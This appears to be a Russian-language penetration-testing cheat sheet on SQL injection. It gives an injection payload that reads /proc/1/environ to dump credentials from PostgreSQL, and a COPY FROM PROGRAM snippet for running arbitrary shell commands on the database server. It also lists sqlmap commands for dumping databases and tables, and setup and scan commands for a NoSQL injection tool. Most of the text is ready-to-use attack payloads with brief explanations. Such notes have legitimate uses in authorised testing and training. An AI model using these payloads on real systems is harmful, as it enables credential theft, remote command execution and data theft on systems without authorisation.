
### Получение дампа кредов

```bash
(SELECT encode(pg_read_binary_file('/proc/1/environ'), 'escape'))::int&order=asc
```
- `/proc/1/environ` - Окружение процесса `init`
- `escape` - текстовая кодировка
- `::int` - приведение к формату
- `&order=asc` - завершение запроса


### RCE через Postgres
Техника `COPY PROGRAM`

```sql
CREATE TEMP TABLE shell(output text) ON COMMIT DROP;
COPY shell FROM PROGRAM '<команда>';
SELECT output FROM shell;
```
- `TEMP TABLE` - таблица существует только в текущей сессии
- `shell` - имя таблицы
- `output text` - одна колонка для вывода команд
- `ON COMMIT DROP` - автоматическое удаление при завершении транзакции
- `COPY ... FROM PROGRAM` - ключевая функция для выполнения команд
- `PROGRAM` - запускает внешнюю программу и читает её вывод
- `<команда>` - любая shell-команда (ls, whoami, id, cat и т.д.)
- Читает вывод команды из временной таблицы


## **SqlMap**

simple
```bash
sqlmap -u "http://target.com/page?id=1"
```

```bash
sqlmap -u "http://target.com/login" --data="username=admin&password=test"
```

```bash
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"
```

full
```bash
sqlmap -u "http://target.com/page?id=1" --dbs --tables --dump
```

```bash
sqlmap -u "http://target.com/page?id=1" --dbms=postgresql
```

```bash
sqlmap -u "http://target.com/page?id=1" --proxy=http://127.0.0.1:8080
```



## **NoSqlMap**

Установка
```bash
git clone https://github.com/Charlie-belmer/nosqli.git
cd nosqli
./build.sh
go install
```

```bash
nosqli scan -t http://localhost:4000/user/lookup?username=test
```





